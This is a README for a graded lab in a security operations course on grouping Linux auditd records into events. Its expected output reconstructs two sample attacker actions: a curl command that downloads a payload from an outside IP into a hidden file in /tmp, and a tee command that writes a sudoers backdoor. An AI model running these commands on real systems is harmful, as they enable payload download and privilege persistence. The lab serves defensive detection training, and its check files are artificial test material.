# m02l04-05 · Reassemble auditd records into events

**Lesson:** [Windows Event Logs, Sysmon & Linux Auditd Telemetry](https://learnsome.tech/learn/secops-course/m02l04) (lesson 2.4, module 2: Log Ingestion & Detection Engineering) · Pro  
**Check:** Graded

## Goal

You can parse Windows Security and Sysmon XML, reassemble auditd records, and write and read a Kubernetes audit policy to see who touched secrets or exec'd into pods.

In the lesson: One action in auditd is several lines: a SYSCALL record, then EXECVE, CWD, PATH and PROCTITLE records. What ties them together is the stamp in brackets, seconds since the epoch, a colon, and a serial number. The program groups every record by that stamp, then reads the fields it needs from each record type. The process title is stored as hex because it contains null bytes between arguments, so it is decoded back to readable text. Now the output. The first event is curl fetching a file into a hidden name in slash tmp, running as uid zero, but the audit user id is one thousand and one, the person who typed sudo. The second event is tee creating a new file in sudoers dot d, a persistence move, caught by the watch rule and tagged priv.

## Files

- [`starter/audit.log`](starter/audit.log)
- [`starter/auditd.py`](starter/auditd.py): the listing from the lesson
- [`expected.txt`](expected.txt): the output the check compares with
- [`check.json`](check.json): how `./check` runs and checks this lab

## Steps

1. Go to the starter: `cd labs/m02l04/m02l04-05/starter`
2. Read `auditd.py` the way the lesson builds it:
   - Lines 1–7: what ties them together is the stamp
   - Lines 8–14: groups every record by that stamp
   - Lines 15–17: decoded back to readable text
   - Lines 18–20: now the output
3. Run it: `python3 auditd.py`.
4. Check it from the repository root: `./check m02l04-05`.

## Expected output

```text
09:44:12 #4521 key=exec auid=1001 uid=0
  cmd: curl -so /tmp/.x http://203.0.113.9/p  paths: /usr/bin/curl /lib64/ld-linux-x86-64.so.2
09:44:41 #4533 key=priv auid=1001 uid=0
  cmd: tee /etc/sudoers.d/99-backdoor  paths: /etc/sudoers.d/ /etc/sudoers.d/99-backdoor
```

## How to check

`./check m02l04-05` copies `starter/` into a scratch directory and runs `python3 auditd.py` there, the way the site's lab sandbox does: that directory is the working directory and `HOME`, `LANG=C.UTF-8`, `TZ=UTC`, a limit of 10 seconds and 256 KiB of output per stream.

It passes when the output matches `expected.txt` by the site's rules, within the limits. Standard output is compared line by line; spaces at the end of a line and blank lines at the end do not count. If that differs, standard output followed by standard error is compared with Python traceback frames and blank lines set aside, so a lesson that shows an error passes when your program prints the same error. A pass here is a pass on the site.

---

[Open the lesson on LearnSome.tech](https://learnsome.tech/learn/secops-course/m02l04) · [All labs of this lesson](../README.md) · [Course README](../../../README.md)
